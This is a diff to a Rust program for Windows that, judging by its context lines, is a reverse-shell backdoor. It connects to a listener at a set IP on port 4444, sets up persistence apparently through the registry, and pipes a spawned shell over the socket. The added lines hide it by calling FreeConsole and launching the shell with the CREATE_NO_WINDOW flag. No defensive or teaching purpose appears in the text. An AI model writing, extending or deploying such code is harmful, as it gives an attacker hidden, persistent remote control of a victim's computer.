@@ -9,6 +9,8 @@ use std::path::PathBuf;
 use winreg::enums::*;
 use winreg::RegKey;
 use std::error::Error as StdError;
+use winapi::um::wincon::FreeConsole;
+use std::os::windows::process::CommandExt;
 
 const REMOTE_HOST: &str = "192.168.1.154"; // Change this to the IP of your listening machine
 const REMOTE_PORT: u16 = 4444;        // Change this to your listening port
@@ -64,6 +66,8 @@ macro_rules! check_read {
 }
 
 fn main() {
+
+    unsafe { FreeConsole() };
     
     // Set up persistence if not already installed
     setup_persistence().unwrap_or_else(|e| {
@@ -156,6 +160,7 @@ fn create_shell(stream: &mut TcpStream) -> Result<(), Box<dyn StdError>> {
         .stdin(Stdio::piped())
         .stdout(Stdio::piped())
         .stderr(Stdio::piped())
+        .creation_flags(0x08000000)// CREATE_NO_WINDOW Flag.
         .spawn()?;
     
     let mut stdin = cmd.stdin.take().unwrap();
